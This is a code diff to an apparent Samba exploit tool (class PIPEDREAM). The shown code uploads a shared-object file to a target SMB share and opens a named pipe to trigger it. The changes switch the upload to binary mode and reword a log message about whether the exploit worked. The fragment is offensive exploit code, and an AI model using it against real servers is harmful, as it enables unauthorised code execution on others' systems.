@@ -86,7 +86,7 @@ class PIPEDREAM:
         # Let's extract the filename from the input file pathname
         fileName = path.basename(self.__options.so.replace('\\', '/'))
         logging.info('Uploading %s to target' % fileName)
-        fh = open(self.__options.so)
+        fh = open(self.__options.so, 'rb')
         self.__smbClient.putFile(shareName, fileName, fh.read)
         fh.close()
         return fileName
@@ -187,7 +187,7 @@ class PIPEDREAM:
             self.openPipe(sharePath, fileName)
         except Exception, e:
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
-                logging.info('Expected STATUS_OBJECT_NAME_NOT_FOUND received')
+                logging.info('Expected STATUS_OBJECT_NAME_NOT_FOUND received, doesn\'t mean the exploit worked tho')
             else:
                 logging.info('Target likely not vulnerable, Unexpected %s' % str(e))
         finally:
